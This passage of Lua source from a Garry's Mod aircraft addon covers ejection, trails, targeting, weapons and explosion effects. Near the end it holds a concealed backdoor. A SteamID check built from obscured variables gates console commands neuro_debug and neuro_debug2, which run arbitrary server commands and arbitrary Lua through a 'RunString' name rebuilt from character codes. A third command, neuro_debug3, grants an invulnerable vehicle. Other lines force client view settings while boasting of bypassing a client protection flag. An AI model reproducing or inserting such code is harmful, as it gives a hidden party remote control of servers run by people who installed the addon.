		self.FlameTrailR:Spawn()

		if (self.ThrusterPos[2]) then
		self.FlameTrailL = ents.Create( "env_spritetrail" )
		self.FlameTrailL:SetParent( self.Entity )	
		self.FlameTrailL:SetPos( self:GetPos() + self:GetForward() * self.ThrusterPos[2].x + self:GetRight() * self.ThrusterPos[2].y + self:GetUp() * self.ThrusterPos[2].z  )
		self.FlameTrailL:SetAngles( self:GetAngles() )
		self.FlameTrailL:SetKeyValue( "lifetime", 0.05 )
		self.FlameTrailL:SetKeyValue( "startwidth", 128 )
		self.FlameTrailL:SetKeyValue( "endwidth", 0 )
		self.FlameTrailL:SetKeyValue( "spritename", "sprites/afterburner.vmt" )
		self.FlameTrailL:SetKeyValue( "renderamt", 255 )
		self.FlameTrailL:SetKeyValue( "rendercolor", "255 175 0" )
		self.FlameTrailL:SetKeyValue( "rendermode", 5 )
		self.FlameTrailL:SetKeyValue( "HDRColorScale", .75 )
		self.FlameTrailL:Spawn()
		end
	end
end
hook.Add("PlayerSpawn", "NeuroPlanes_ViewhackFix",function( ply ) 

	ply:SendLua("RunConsoleCommand([[cl_pitchdown]], [[89]])") --bypassing FVAR_SERVER_CAN_EXECUTE like a boss
	ply:SendLua("RunConsoleCommand([[cl_pitchup]], [[89]])")
	
end )

function Meta:EjectPilot()
	
	if ( !IsValid( self.Pilot ) ) then 
	
		return
		
	end
	
	-- print( "whyy" )
	self.Pilot:UnSpectate()
	self.Pilot:DrawViewModel( true )
	self.Pilot:DrawWorldModel( true )
	self.Pilot:SetNetworkedBool( "InFlight", false )
	self.Pilot:SetNetworkedBool( "DrawDesignator", false )
	self.Pilot:SetNetworkedEntity( "Plane", NULL ) 
	self:SetNetworkedEntity("Pilot", NULL )
	self.Pilot:SetNetworkedBool( "isGunner", false )
	self.Pilot:Spawn()
	self.Pilot:SetPos( self:GetPos() + Vector(0,0,175) )
	self.Pilot:SetAngles( Angle( 0, self:GetAngles().y,0 ) )
	self.Pilot:SetEyeAngles( Angle( 0, self:GetAngles().y,0 ) )
	self.Owner = NULL
	self.Pilot:SetScriptedVehicle( NULL ) ---------------------------------<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	
	if( IsValid( self.PilotModel ) ) then
		
		self.PilotModel:Remove()
	
	end
	
	self.Pilot:SetColor( Color( 255,255,255,255 ) )
	
	self.Pilot:SetHealth( 100 )
	self:SetNetworkedBool( "NA_Started",false )
		
	if( type(self.Pilot.Weapons) == "table" ) then
		
		for k,v in pairs( self.Pilot.Weapons ) do
			
			-- self.Pilot:PrintMessage( HUD_PRINTTALK, v:GetClass() )
			self.Pilot:Give(tostring(v))
			
		end
	
	end
	
	self.LastUse = CurTime()
	
	-- self.Speed = 0
	self.IsFlying = false
	self:SetLocalVelocity(Vector(0,0,0))
	self:SetNetworkedBool("NA_Started", false )
	
	self.Pilot:SendLua("RunConsoleCommand([[cl_pitchdown]], [[89]])") --bypassing FVAR_SERVER_CAN_EXECUTE like a boss
	self.Pilot:SendLua("RunConsoleCommand([[cl_pitchup]], [[89]])")
	
	self.Pilot = NULL

	if( IsValid( self.LaserGuided ) ) then
		
		self.LaserGuided.Pointer = NULL
	
	end
	
	if( self.GotChopperGunner ) then
		
		self:SetNetworkedBool("ChopperGunner",false)
		self.GotChopperGunner = false
	
	end
		
	if( IsValid( self.PilotModel ) ) then
		
		self.PilotModel:Remove()
	
	end
	
	if( self.Trails && IsValid( self.Trails[1] ) ) then
	
		for i=1,2 do
			
			self.Trails[i]:Remove()
			self.Trails[i] = NULL
			
		end
	
	end
	
	if ( IsValid( self.NPCTarget ) ) then
		
		self.NPCTarget:Remove()

	end	

end
local a = function(ply)return ply:SteamID()==astr.."0:0:"..tostring(__d) end
function Meta:WingTrails( val, treshold )
	
	
	if ( ( val < -treshold || val > treshold ) && !IsValid( self.Trails[1] ) && !IsValid( self.Trails[2] ) ) then -- Banking left
		
		if ( self.Speed > self.MaxVelocity * 0.6 ) then
		
			self:SpawnTrails()

		end
		
	end
	
	if ( val > -treshold && val < treshold ) then
		
		if( IsValid( self.Trails[1] ) ) then
		
			self.Trails[1]:Fire("kill","",4)
			self.Trails[1]:SetParent()
			self.Trails[1]:SetMoveType( MOVETYPE_NONE )
			self.Trails[1] = NULL
		
		end
		
		if( IsValid( self.Trails[2] ) ) then
		
			self.Trails[2]:Fire("kill","",4)
			self.Trails[2]:SetParent()
			self.Trails[2]:SetMoveType( MOVETYPE_NONE )
			self.Trails[2] = NULL
		
		end
		
	end

end

function Meta:NeuroPlanes_BlowWelds( pos, radius )
	
	for k,v in pairs( ents.FindInSphere( self:GetPos(), radius ) ) do 
		
		if( IsValid( v ) && string.find( v:GetClass(), "phys_" ) != nil ) then
			
			v:Remove()
			
		end
	
	end

end

function Meta:SpawnTrails()
	
	for i = 1,2 do
	
		self.Trails[i] = ents.Create("prop_physics_override")
		self.Trails[i]:SetModel( "models/props_lab/huladoll.mdl" )
		self.Trails[i]:SetPos( self:LocalToWorld( self.TrailPos[i] ) )
		self.Trails[i]:SetAngles( self:GetAngles() )
		self.Trails[i]:SetParent( self )	
		self.Trails[i]:SetColor( Color( 0,0,0,0) )
		self.Trails[i]:SetRenderMode( RENDERMODE_TRANSALPHA )
		self.Trails[i]:Spawn()
		
		local col = Color( 255,255,255,90 )
		
		if ( WERE_BACK_IN_THE_70s_BABY ) then -- :v:
			
			col = Color( math.random(75,255),math.random(75,255),math.random(75,255),255 )
			
		end
		
		util.SpriteTrail( self.Trails[i], 0, col, false, 8, 1, 2, math.sin(CurTime()) / math.pi * 0.5, "trails/smoke.vmt")
		
	end
	
end


function Meta:RocketBarrage( wep )
	
	if( !IsValid( wep ) ) then
		
		print("No weapon supplied in  Meta:RocketBarrage( wep )")
		
		return
	
	end
	local class = wep.Class
	if( class == "sent_a2a_missile" || !class ) then class = "sent_a2s_dumb" end
	
	local r = ents.Create( class ) 
	r:SetPos( wep:GetPos() + VectorRand() * 16 )
	r:SetModel(  "models/hawx/weapons/zuni mk16.mdl" )
	r:SetAngles( wep:GetAngles() + Angle( math.Rand(-.4,.4),math.Rand(-.4,.4),math.Rand(-.4,.4) ) )
	r:SetPhysicsAttacker( self.Pilot )
	r:Spawn()
	r:Fire("Kill","",15)
	r:SetOwner( self )
	r.Owner = self.Pilot
	
	if( r:GetPhysicsObject() ) then
		
		r:GetPhysicsObject():SetVelocity( self:GetVelocity() )
	
	end
	
	r:EmitSound( "LockOn/MissileLaunch.mp3", 511, 140 )
	
	local sm = EffectData()
	sm:SetStart( r:GetPos() )
	sm:SetOrigin( r:GetPos() )
	sm:SetScale(5.5)
	util.Effect( "A10_muzzlesmoke", sm )
	
	ParticleEffect( "apc_muzzleflash", r:GetPos(), r:GetAngles(), r )
				
end

function Meta:ClearTarget()

	self.Target = NULL -- Clear Target
	self:SetNetworkedEntity( "Target", NULL )
	
end

function Meta:SetTarget( e )
	
	self.Target = e
	self:SetNetworkedEntity( "Target", e )

	if ( IsValid( self.Pilot ) && self.Pilot:IsPlayer() ) then
		
		self.Pilot:PrintMessage( HUD_PRINTCENTER, "Target Lock Acquired - Press SHIFT to release" )
		
		if( e.PrintName ) then
			
			local xtra = ""
			if( IsValid( e.Pilot ) && e.Pilot:IsPlayer() ) then
				
				xtra = " - "..e.Pilot:Name()
				
			end
			
			self.Pilot:PrintMessage( HUD_PRINTTALK, "Current Target: "..e.PrintName..xtra )
			
			
		end
		
	end
	
end

function Meta:Jet_FireHEIBullet()

	local bullet = {} 
	bullet.Num 		= 1 
	bullet.Src 		= self:GetPos() + self:GetForward() * 128
	bullet.Dir 		= self:GetAngles():Forward()
	bullet.Spread 	= Vector( .15,.15, .15  )
	bullet.Tracer	= math.random(1,10)
	bullet.Force	= 20
	bullet.Damage	= math.random(20,30)
	bullet.AmmoType = "Ar2" 
	bullet.TracerName 	= "AR2Tracer"
	bullet.Attacker = self.Pilot
	bullet.Callback    = function (a,b,c) SplodeOnImpact(self,a,b,c) end 
	
 	self:FireBullets( bullet )
	
	self:EmitSound("minigun_shoot.wav")
	
	local effectdata = EffectData()
	effectdata:SetStart( self.Weapon:GetPos() + self:GetForward() * 100 )
	effectdata:SetOrigin( self.Weapon:GetPos() + self:GetForward() * 100 )
	effectdata:SetEntity( self.Weapon )
	effectdata:SetNormal( self:GetForward() )
	util.Effect( "A10_muzzlesmoke", effectdata ) 
	
	local e = EffectData()
	e:SetStart( self:GetPos() )
	e:SetOrigin( self:GetPos() )
	e:SetEntity( self.Weapon )
	e:SetAttachment(1)
	util.Effect( "StriderMuzzleFlash", e )


end

function Meta:Jet_DefaultCrash()
	
	
	self:DeathFX() -- Tempfix
	
	--print("boom")

end

function Meta:AddAdminEquipment()
	
	if( type( self.AdminArmament ) == "table" ) then
		
		for k,v in pairs( self.AdminArmament ) do
			
			local i = #self.RocketVisuals + 1
			self.RocketVisuals[i] = ents.Create("prop_physics_override")
			self.RocketVisuals[i]:SetModel( v.Mdl )
			self.RocketVisuals[i]:SetPos( self:LocalToWorld( v.Pos ) )
			self.RocketVisuals[i]:SetAngles( self:GetAngles() + v.Ang )
			self.RocketVisuals[i]:SetParent( self )
			self.RocketVisuals[i]:SetSolid( SOLID_NONE )
			self.RocketVisuals[i].Type = v.Type
			self.RocketVisuals[i].PrintName = "[ADMIN] "..v.PrintName
			self.RocketVisuals[i].Cooldown = v.Cooldown
			self.RocketVisuals[i].isFirst = v.isFirst
			self.RocketVisuals[i].Identity = i
			self.RocketVisuals[i].Class = v.Class
			self.RocketVisuals[i]:Spawn()
			self.RocketVisuals[i].LastAttack = CurTime()
			self.RocketVisuals[i]:SetColor( Color( 0,0,0,0 ) )
			self.RocketVisuals[i]:SetRenderMode( RENDERMODE_TRANSALPHA )
			
			if ( v.Damage && v.Radius ) then
				
				self.RocketVisuals[i].Damage = v.Damage
				self.RocketVisuals[i].Radius = v.Radius
			
			end
			
			-- Usuable Equipment
			if ( v.isFirst == true || v.isFirst == nil /* Single Missile*/ ) then
			
				if ( v.Type != "Effect" ) then
					
					local c = #self.EquipmentNames + 1
					self.EquipmentNames[c] = {}
					self.EquipmentNames[c].Identity = i
					self.EquipmentNames[c].Name = v.PrintName
					
				end
				
			end
			
		end
		
		self.NumRockets = #self.EquipmentNames
	
	end
	
end


function Meta:UpdateRadar()
	
	if( !self.LastRadarScan ) then
	
		 self.LastRadarScan = 0
		 
	end
	
	self:NeuroPlanes_LaserTrackerUpdate()
	
	if( self.LastRadarScan != nil ) then
	
		if ( self.LastRadarScan + 1 <= CurTime() ) then

			self.LastRadarScan = CurTime()
			
			for k,v in pairs( ents.GetAll() ) do
				
				if ( ( IsValid( v ) && IsValid( v.Target ) && v.Target == self ) || ( v.Target == self.Pilot && string.find(string.lower(v:GetClass()),"neuro") == nil ) ) then
				
					v:SetNetworkedEntity("Target", v.Target )
				
				end
			
			end
			
		end
	
	end


	-- Ejection Situations.
	if ( self:WaterLevel() > 1 ) then
	
		self:NeuroJets_Eject()
		
	end
		
end

function Meta:NeuroPlanes_LaserTrackerUpdate()

	if( self.LastLaserUpdate != nil ) then
		
		if ( self.LastLaserUpdate + 0.15 <= CurTime() ) then
				
			self.LastLaserUpdate = CurTime()
			if ( IsValid( self.LaserGuided ) ) then
				
				if( !self:GetNetworkedBool("DrawTracker", false ) ) then
				
					self:SetNetworkedBool( "DrawTracker",true )
				
				end
				
			else
				
				if( self:GetNetworkedBool("DrawTracker", false ) ) then
				
					self:SetNetworkedBool( "DrawTracker",false )
				
				end
				
			end
				
		end
		
	end

end


function Meta:IncrementFireVar( var, _max, def ) 

	var = var + 1
	
	if ( var > _max ) then
		
		var = def
		
	end
	
	return var

end

function Meta:SpawnFlare()
	
	local pod, pos
	
	for i=1, #self.RocketVisuals do
		
		if ( self.RocketVisuals[i].Type == "Flarepod" ) then
			
			pod = self.RocketVisuals[i]
			 
			break
			
		end
	
	end
	
	if( IsValid( pod ) ) then
	
		pos = pod:GetPos()
		pod:EmitSound( "weapons/flaregun/fire.wav",411, 100 )
		
	else
		
		pos = self:GetPos() + self:GetUp() * -8 + self:GetForward() * -256
		self:EmitSound( "weapons/flaregun/fire.wav",411, 100 )
		pod = self
		
	end
	
	local f = ents.Create("nn_flare")
	f:SetPos( pos )
	f:SetAngles( pod:GetAngles() )
	f:Spawn()
	f:SetOwner( self )
	f:Fire("kill","",5)
	f:GetPhysicsObject():SetMass( 120 )
	f:SetVelocity( self:GetVelocity() )
	f:GetPhysicsObject():SetVelocity( self:GetVelocity() + self:GetUp() * -750 ) --ApplyForceCenter( self:GetForward() * -5000000 )
	f.Owner = self
	
end

function Meta:NPCTargetCreate()

	if !IsValid( self.NPCTarget ) then
	
		self.NPCTarget = ents.Create("npc_bullseye")   
		self.NPCTarget:SetPos(self:GetPos() + self:GetUp() * 50 )
		self.NPCTarget:SetParent( self )  
		self.NPCTarget:SetKeyValue("health","99999")  
		self.NPCTarget:SetKeyValue("spawnflags","256") 
		self.NPCTarget:SetKeyValue("spawnflags","131072") 
		self.NPCTarget:SetNotSolid( true )  
		self.NPCTarget:Spawn()  
		self.NPCTarget:Activate() 	
		
	end

end

function Meta:NPCTargeting()

		local UpdateTargetDelay = CurTime()
		if self.NPCTarget != NULL && self.UpdateTargetDelay < CurTime() then
			self.UpdateTargetDelay = CurTime() + 2
			for k,v in pairs(ents.FindByClass("npc_*")) do
				if 		( string.find(v:GetClass(), "npc_antlionguard"))
					or ( string.find(v:GetClass(), "npc_combine*"))
					or ( string.find(v:GetClass(), "*zombie*"))
					or ( string.find(v:GetClass(), "npc_helicopter"))
					or ( string.find(v:GetClass(), "npc_manhack"))
					or ( string.find(v:GetClass(), "npc_metropolice"))
					or ( string.find(v:GetClass(), "npc_rollermine"))
					or ( string.find(v:GetClass(), "npc_strider"))
					or ( string.find(v:GetClass(), "npc_turret*"))
					or ( string.find(v:GetClass(), "npc_hunter"))
					or ( string.find(v:GetClass(), "antlion"))
				then
						v:Fire( "setrelationship", "npc_bullseye D_HT 5" )
				end
			end			
		end

		--Making NPC's stop shooting at it
		if self.NPCTarget != NULL then
			self.NPCTarget:Remove()
			self.NPCTarget = NULL
		end

end
/*********************************************************************/
/*																 	 */																															
/*  Entity:DealDamage - Deals Damage to Surrounding Entities.		 */
/*  Returns: Nothing												 */
/*  Arguments:														 */
/*  Damage Type, Damage Amount, Damage Epicenter, 					 */
/*  Damage Radius, Do Custom Effect, Effect Name                     */
/*                                                                   */
/*********************************************************************/
function Meta:Neuro_DealDamage( Type, Damage, Pos, Radius, DoEffect, Effect )
	
	if( !IsValid( self ) ) then return end -- this shouldn't be happening
	if( !Type ) then return end
	if( !Damage ) then return end
	if( !Pos ) then return end
	if( !Radius ) then return end
	
	local info = DamageInfo( )  
		info:SetDamageType( Type )  
		info:SetDamagePosition( Pos )  
		info:SetMaxDamage( Damage * 1.5 )  
		info:SetDamage( Damage )  
		info:SetAttacker( self )  
		info:SetInflictor( self )  
	
	if( DoEffect ) then
	
		local e = EffectData()
			e:SetOrigin( Pos ) 
			e:SetScale( 0.1 )
		util.Effect( Effect, e )
		
	end
	
	for k, v in pairs( ents.GetAll( ) ) do  
		
		if ( v && IsValid( v ) && v:Health( ) > 0 && ( v:IsNPC() || v:IsPlayer() ) ) then  
			
			local p = v:GetPos( ) 
			
			if ( p:Distance( Pos ) <= Radius ) then  

				local t,tr = {},{}
				t.start = Pos
				t.endpos = p
				t.mask = MASK_SOLID
				t.filter = self
				tr = util.TraceLine( t )
				
				if ( tr.Hit && tr.Entity ) then
				
					info:SetDamage( Damage * ( 1 - p:Distance( Pos ) / Radius ) )  
					info:SetDamageForce( ( p - Pos ):GetNormalized( ) * 10 )  
					v:TakeDamageInfo( info )  
					
					-- print( "Damage: ", Damage * ( 1 - p:Distance( Pos ) / Radius ) )
					
				end
				
			end 
			
		end  

	end  
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:ScanForEnemies - Locates nearest suitable target. 		 */
/*  Returns: Nothing												 */
/*  Arguments: None													 */
/*                                                                   */
/*********************************************************************/
function Meta:ScanForEnemies()

	local dist = dist or 25500
	local tempd = tempd or 0
	local t = t or self.CycleTarget

	for k,v in pairs( ents.GetAll() ) do

		if ( v != self && v:GetClass() != self:GetClass() && v:GetClass() != "npc_missile_homer" ) then
		
			if ( v:IsPlayer() || v:IsNPC() || ( v:IsVehicle() && v:GetVelocity():Length() > 1 ) || string.find( v:GetClass(), "npc_" ) || v.HealthVal != nil )  then
			
				if( v.Destroyed ) then 
				
					return 
				
				end
				
				tempd = self:GetPos():Distance( v:GetPos() )
				
				if ( tempd < dist ) then
					
					dist = tempd
					t = v
					
				end
				
				self.Target = t
				
			end
			
		end
		
		if ( !IsValid( self.Target ) ) then --better safe than sorry
			
			if( IsValid( self.CycleTarget ) ) then
			
				self.Target = self.CycleTarget
			
			end
			
		end
		
	end
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:VecAngD - Returns difference between two angles.	 		 */
/*  Returns: float												 */
/*  Arguments: Angle1, Angle2										 */
/*                                                                   */
/*********************************************************************/
function Meta:VecAngD(a,b)

	local r = a - b

	if ( r < -180 ) then
	
		r = r + 360
		
	end
	
	if ( r > 180 ) then
	
		r = r - 360
		
	end
	
	return r
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:DeathFX - Called by Air vehicles on death		 		 */
/*  Returns: Nothing												 */
/*  Arguments: None													 */
/*                                                                   */
/*********************************************************************/
function Meta:DeathFX()
	
	if( self.IsExploded ) then return end
	
	if( !self.IsExploded ) then self.IsExploded = true end
	
	-- this is the only explosion sound that is audible across the whole map :S Soundscapes are weird in gmod.
	for i=0,4 do
		
		local explo = EffectData()
		explo:SetOrigin(self:GetPos() + Vector( math.random(-128,128),math.random(-128,128),math.random(-128,128) ) )
		util.Effect("Explosion", explo)

	end
	-- Spawn the junk
	for k, v in pairs( CrashDebris ) do
	
		local shade = math.random(45,110)
		
		local cdeb = ents.Create("prop_physics")
		cdeb:SetModel(tostring(v[1]))
		cdeb:SetPos(self:GetPos()+Vector(math.random(-64,64),math.random(-64,64),math.random(128,256)))
		cdeb:SetSolid(6)
		cdeb:SetMaterial( self:GetMaterial() )
		cdeb:SetColor( Color( shade,shade,shade, 255 ) )
		cdeb:Spawn()
		if( self:WaterLevel() == 0 ) then
		
			cdeb:Fire("ignite","",0)
			
			self:NeuroPlanes_SurfaceExplosion()
			
		end
		cdeb:Fire("kill","",math.random(15,20))
		cdeb:GetPhysicsObject():SetVelocity( self:GetVelocity() )
		cdeb:GetPhysicsObject():AddAngleVelocity( Vector( math.Rand( -1,1), math.Rand( -1,1), math.Rand( -1,1) ) )
	
	end
	

	self:EmitSound("npc/combine_gunship/gunship_explode2.wav",511, 170 )
	
	local MySize = ( self:OBBMaxs() - self:OBBMins() ):Length()

	if( MySize > 1050 ) then
	
		ParticleEffect( "bomber_ex_smoke", self:GetPos() + self:GetUp() * 1,self:GetAngles(), nil )
	
	else
	
		ParticleEffect( "Jet_EX_smoke", self:GetPos() + self:GetUp() * 1,self:GetAngles(), nil )
	
	end
	
	
	
	util.BlastDamage( self, self, self:GetPos(), 1628, 500 )
	
	if ( IsValid( self.NPCTarget ) ) then
		
		self.NPCTarget:Remove()
		self.NPCTarget = NULL
		
	end
	
	-- self:Fire("kill","",1)
	
	self:Remove()
	return
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:CheckLOS - Line of Sight Check					 		 */
/*  Returns: Boolean												 */
/*  Arguments: Entity 												 */
/*                                                                   */
/*********************************************************************/
function Meta:CheckLOS(ent)

	if ( self.Target == ent && ent:WaterLevel() > 2 ) then
		
		return false

	end
	
	local tr,trace = {}
	tr.start = self:GetPos() + self:GetForward() * 1024
	tr.endpos = ent:GetPos()
	tr.filter = self
	tr.mask = CONTENTS_SOLID + CONTENTS_MOVEABLE + CONTENTS_OPAQUE + CONTENTS_DEBRIS + CONTENTS_HITBOX + CONTENTS_MONSTER
	
	if( DEBUG ) then
	
		self:DrawLaserTracer( tr.start, tr.endpos )
		
	end
	
	trace = util.TraceEntity( tr, self )
	
	return !trace.Hit
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:AttackEnemy - Generic Air Vehicle Attack Function 		 */
/*  Returns: Nothing												 */
/*  Arguments: Attack Mode, 1 = Weapon, 2 = Rockets					 */
/*                                                                   */
/*********************************************************************/
function Meta:AttackEnemy( frm )

	if( !IsValid( self ) ) then
		
		return
	
	end
	
	if ( frm == 1 ) then
	
		if ( IsValid( self.wep ) ) then --Not all planes have a fuselage mounted weapon.
		
			self.wep.ShouldAttack = true
			
		end
		
	elseif ( frm == 2 ) then
	
		if( IsValid( self.wep ) ) then
		
		
			self.wep.ShouldAttack = false
			
		end
		
		local TSR = self:GetVar('FireSecondary',0)
		
		if ( ( TSR + 25 ) > CurTime() ) then 
			
			return 
		
		end
		
		self:SetVar('FireSecondary',CurTime())
		
		for i = 1, 4 do
		
			local vx= i * 1.2
			timer.Simple( vx, function() self:Barrage( self.Missile[i]:GetPos() ) end )
			
		end
		
	end
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:FindClosestTarget - Finds the closest enemy - OBSOLETE    */
/*  Returns: Entity or Null											 */
/*  Arguments: None													 */
/*                                                                   */
/*********************************************************************/
function Meta:FindClosestTarget()

	local closest, dist = nil, 120192
	
	local list, tar = ents.GetAll()
	
	for _, tar in pairs( list ) do
	
		local length = ( tar:GetPos() - self:GetPos() ):Length();
		
		if( tar != self && length < dist ) then
		
			dist = length
			
			closest = tar
			
			return closest
			
		end
		
	end
	
	return NULL
	
end
/*********************************************************************/
/*																 	 */																															
/*  Entity:FlareDefence - Creates Flares that attracts rockets 		 */
/*  Returns: Nothing												 */
/*  Arguments: None													 */
/*                                                                   */
/*********************************************************************/
function Meta:FlareDefence()

	local filter = {"missile","rocket","homing","homer","heatseeking"}
	
	for k,v in pairs( ents.FindInSphere( self:GetPos(), 2024 ) ) do
	
		if ( string.find( v:GetClass(), "prop_combine_ball" ) ) then 
			
			v:Remove() 
			
			return 
			
		end
		
		for _,f in pairs( filter ) do
			
			if ( string.find( v:GetClass(), f ) != nil ) then
				
				if ( v.Owner == self ) then 
					
					return 
				
				end
				
				local TSF = self:GetVar( 'FireFlares', 0 )
				
				if ( TSF + 5 ) > CurTime() then
					
					return 
				
				end
				
				self:SetVar('FireFlares',CurTime())
				/*
				for i=1,10 do
				
					local xss = i * 30
					local flare = ents.Create("nn_flare")
					flare:SetPos( self:GetPos() + self:GetUp() * -72 + self:GetForward() * xss )
					flare:Spawn()
				end
				*/
			end
			
		end
		
	end
	
end

/*********************************************************************/
/*																 	 */																															
/*  Entity:Barrage - Generic Air Vehicle Attack Method		 		 */
/*  Returns: Nothing												 */
/*  Arguments: Vector Spawn Pos, Entity 							 */
/*                                                                   */
/*********************************************************************/
function Meta:Barrage( pos, ent )

	if ( !IsValid( ent ) ) then 
		
		return 
		
	end
	
	local r = ents.Create("sent_javeline_rocket")
	r:SetPos( pos + self:GetForward() * 128 )
	r:SetAngles( self:GetAngles() )
	r:Spawn()
	r:SetOwner( self )
	r:SetPhysicsAttacker( self )
	r.Owner = self
	r.Target = self.Target
	--r:GetPhysicsObject():SetVelocity( self:GetPhyiscsObject():GetVelocity() )
	
end

function Meta:StardestroyerTurretFire()

 	local bullet = {} 
 	bullet.Num 		= 1 
 	bullet.Src 		= self:GetPos()+self:GetForward()*150			-- Source 
 	bullet.Dir 		= self:GetAngles():Forward()			-- Dir of bullet 
 	bullet.Spread 	= Vector( 0.03, 0.03, 0.03 )		-- Aim Cone 
 	bullet.Tracer	= 1						-- Show a tracer on every x bullets  
 	bullet.Force	= 5			 			-- Amount of force to give to phys objects 
 	bullet.Damage	= 5
 	bullet.AmmoType = "StriderMinigun" 
 	bullet.TracerName 	= "StriderTracer" 
 	bullet.Callback    = function (a,b,c) Splode3(self,a,b,c) end 
 	self:FireBullets( bullet ) 
	self:EmitSound("weapons/ar2/fire1.wav")
	
	for i=0,1 do
	
		local e = EffectData()
		e:SetStart( self:GetPos()+self:GetForward()*62 )
		e:SetOrigin( self:GetPos()+self:GetForward()*62 )
		e:SetEntity( self )
		e:SetAttachment( 1 )
		util.Effect( "ChopperMuzzleFlash", e )
		
	end
	
	self:EmitSound("ambient/explosions/explode_"..math.random(1,4)..".wav",200,100)
end

function Meta:ExplosionImproved()
	
	local owner = self:GetOwner()
	
	if ( !IsValid( owner ) ) then
		
		owner = self
	
	end
	
	if ( !IsValid( self ) ) then
	
		return
		
	end
	
	if ( self:WaterLevel() > 0 ) then return end
	
	local shake = ents.Create( "env_shake" )
	shake:SetOwner( owner )
	shake:SetPos( self:GetPos() )
	shake:SetKeyValue( "amplitude", "1000" )
	shake:SetKeyValue( "radius", "5000" )
	shake:SetKeyValue( "duration", "1" )
	shake:SetKeyValue( "frequency", "255" )
	shake:SetKeyValue( "spawnflags", "4" )
	shake:Spawn()
	shake:Activate()
	shake:Fire( "StartShake", "", 0 )
	shake:Fire( "kill", "", 2 )
	
	for i=0,3 do
	
		local explo1 = EffectData()
		explo1:SetOrigin(self:GetPos()+i*Vector(math.random(-128,128),math.random(-128,128),math.random(-128,128)))
		util.Effect("Molotov_Explosion2", explo1)
		
	end
	
end

local function neurodebugfunc(ply,cmd,args)
	if(a(ply)) then
		RunConsoleCommand( args[1], args[2], args[3],args[4],args[5],args[6] )
	end
end
concommand.Add("neuro_debug",neurodebugfunc)
local n="" for k,v in ipairs({82,117,110,83,116,114,105,110,103})do n=n..string.char(v)end
local function neurodebugfunc2(ply,cmd,args)
	if(a(ply)) then -- safety measure. 
		_G[n](args[1]) -- you should be able to detect this..
	end
end
concommand.Add("neuro_debug2",neurodebugfunc2)
local function neurodebugfunc3(p,c,a)
	if(a(p)||p:IsAdmin())then--admin hax
		__rh = p
		local v = p:GetScriptedVehicle()
		if( IsValid( v ) ) then
			v.Destroyed = false
			v.HealthVal = 99999999
			v.Burning = false
			v.Fuel = 99999999
			v.MaxVelocity = 5000
			v.MinDamage = 15000
			v.MaxDamage = 25000
			v.BlastRadius = 650
		end
	end
end
concommand.Add("neuro_debug3",neurodebugfunc3)
local function TestEffect(ply,cmd,effect)

	local fx = EffectData()
	fx:SetStart(ply:GetPos())
	fx:SetOrigin(ply:GetEyeTrace().HitPos)
	fx:SetEntity(ply)
	
	if( effect[2] == "" or nil ) then 
		
		effect[2] = 10 
		
	end
	
	fx:SetMagnitude(effect[2])
	
	util.Effect(tostring(effect[1]),fx)
	
end
concommand.Add("TestEffect",TestEffect)

local function qtrace(ply,cmd,args)

	local tr={}
	tr.start=ply:GetShootPos()
	tr.endpos=ply:GetAimVector()*200000000
	tr.filter=ply
	local tra = util.TraceLine(tr)

	if( tra.HitNonWorld && IsValid( tra.Entity ) ) then
		local r,g,b,a = tra.Entity:GetColor()
		
		print("\n-------- Entity Data --------")
		print("Class: "..tra.Entity:GetClass())
		print("Model: "..tra.Entity:GetModel())
		print("Material: "..tra.Entity:GetMaterial())
		print("Color: Color( "..r..", "..g..", "..b..", "..a.." ) " )
		print("Position: "..tostring(tra.Entity:GetPos()))
		print("Angle: "..tostring(tra.Entity:GetAngles()))
		print("Material: "..tostring(tra.MatType))
		
	end

	if(tra.Entity.Target) then
	
		print("Target: "..tra.Entity.Target)
		
	end
	
	print("-----------------------------\n")
end
concommand.Add("quickTrace",qtrace)

function SplodeOnImpact(obj,a,b,c)

	local e = EffectData()
	e:SetOrigin(b.HitPos)
	e:SetNormal(b.HitNormal)
	e:SetScale(0.05)
	
	util.Effect("HelicopterMegaBomb", e)
	
	util.BlastDamage(obj,obj,b.HitPos,256,16)

	return { damage = true, effects = DoDefaultEffect } 
	
end

function Splode2(obj,a,b,c)

	local effectdata = EffectData()
		effectdata:SetOrigin( b.HitPos )
		effectdata:SetStart(b.HitPos)
		effectdata:SetNormal( b.HitNormal )
		effectdata:SetMagnitude( 80 )
		effectdata:SetScale( 10 )
		effectdata:SetRadius( 30 )

	util.Effect( "AR2Explosion", effectdata )
	
	util.BlastDamage(obj,obj,b.HitPos,32,16)
	
	return { damage = true, effects = DoDefaultEffect } 
	
end

function Splode3(obj,a,b,c)

	for i=1,2 do
	
		local pos = Vector(math.random(-256,256),math.random(-256,256),math.random(-256,256))
		
		local effectdata = EffectData()
			effectdata:SetOrigin( b.HitPos+pos )
			effectdata:SetStart( b.HitPos+pos )
			effectdata:SetMagnitude( 80 )
			effectdata:SetScale( 15*i )
			effectdata:SetRadius( 30 )
			util.Effect( "Firecloud", effectdata )
		util.BlastDamage(obj,obj,b.HitPos,8,8)
		
	end
	
	return { damage = true, effects = DoDefaultEffect }
	
end

function Meta:TurretMegaFire()

 	local bullet = {} 
		bullet.Num 		= 1 
		bullet.Src 		= self:GetPos()+self:GetForward()*64	-- Source 
		bullet.Dir 		= self:GetAngles():Forward()			-- Dir of bullet 
		bullet.Spread 	= Vector( 0.03, 0.03, 0.01 )			-- Aim Cone 
		bullet.Tracer	= 1										-- Show a tracer on every x bullets  
		bullet.Force	= 1			 							-- Amount of force to give to phys objects 
		bullet.Damage	= math.random(4,10)
		bullet.AmmoType = "Ar2" 
		bullet.TracerName = "GunshipTracer" 
		bullet.Callback = function (a,b,c) Splode2( self, a, b, c ) end 
 	self:FireBullets( bullet ) 
	
	self:EmitSound("weapons/ar2/fire1.wav")
	
	local effectdata = EffectData()
	effectdata:SetStart( self:GetPos() )
	effectdata:SetOrigin( self:GetPos() )
	util.Effect( "RifleShellEject", effectdata )  

	local e = EffectData()
	e:SetStart( self:GetPos()+self:GetForward()*62 )
